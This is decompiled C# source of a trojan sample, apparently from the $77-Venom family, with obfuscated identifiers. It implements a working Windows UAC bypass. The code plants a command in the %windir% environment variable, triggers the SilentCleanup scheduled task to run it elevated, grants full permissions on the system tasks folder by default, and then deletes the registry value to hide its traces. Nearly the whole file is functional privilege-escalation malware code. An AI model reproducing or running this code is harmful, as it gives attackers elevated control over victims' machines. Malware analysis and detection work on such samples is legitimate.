// Decompiled with JetBrains decompiler
// Type: 嫞�͕掮댻訜쳙᭤ṡ⒕฾�焣꿟㳝쌛⹽
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

public class \uEFEC嫞\uE260\uE208\uFFFD͕掮댻訜쳙\u1B64ṡ\u2495\u0E3E\uFFFD焣꿟㳝쌛\u2E7D
{
  public static void \u2977锴ꦑ濯\u2257斍ꅅ\uF4B5ꎬ蓨툰ᰁ㛬﨔豣\u2498ᕂ꾒ꇑ溢(string[] args)
  {
    Console.WriteLine("[+] Starting Bypass UAC.");
    string environmentVariable = Environment.GetEnvironmentVariable("SYSTEMROOT/tasks");
    string name = WindowsIdentity.GetCurrent().Name;
    string str;
    if (args.Length != 0)
    {
      str = args[0];
      Console.WriteLine("[+] Payload to be Executed " + str);
    }
    else
    {
      Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
      str = "C:\\Windows\\System32\\cmd.exe Cacls " + environmentVariable + " /e /t /g " + name + ":F";
    }
    try
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Environment");
      subKey.SetValue("windir", (object) ("cmd.exe /k " + str + " & "), RegistryValueKind.String);
      subKey.Close();
      Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
      Console.WriteLine("[-] Exit.");
    }
    Console.WriteLine("[+] Waiting 5 seconds before execution.");
    Thread.Sleep(5000);
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        FileName = "schtasks.exe",
        Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
      });
      Console.WriteLine("[+] UAC Bypass Application Executed.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
    }
    \uEFEC嫞\uE260\uE208\uFFFD͕掮댻訜쳙\u1B64ṡ\u2495\u0E3E\uFFFD焣꿟㳝쌛\u2E7D.檒鼎\uF5CC㧸쓈꽋됿翂炊\u2751胫荖\uF50B撐\u0007᷈諟\uF205퐩랿();
    Console.WriteLine("[-] Exit.");
  }

  private static void 檒鼎\uF5CC㧸쓈꽋됿翂炊\u2751胫荖\uF50B撐\u0007᷈諟\uF205퐩랿()
  {
    Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
    Thread.Sleep(5000);
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Environment", true);
      if (registryKey != null)
      {
        try
        {
          registryKey.DeleteValue("windir");
          registryKey.Close();
        }
        catch (Exception ex)
        {
          Console.WriteLine("[-] Unable to Delete the Registry key (Environment). Error " + ex.Message);
        }
      }
      Console.WriteLine("[+] Registry Cleaned.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Clean the Registry.");
    }
  }
}
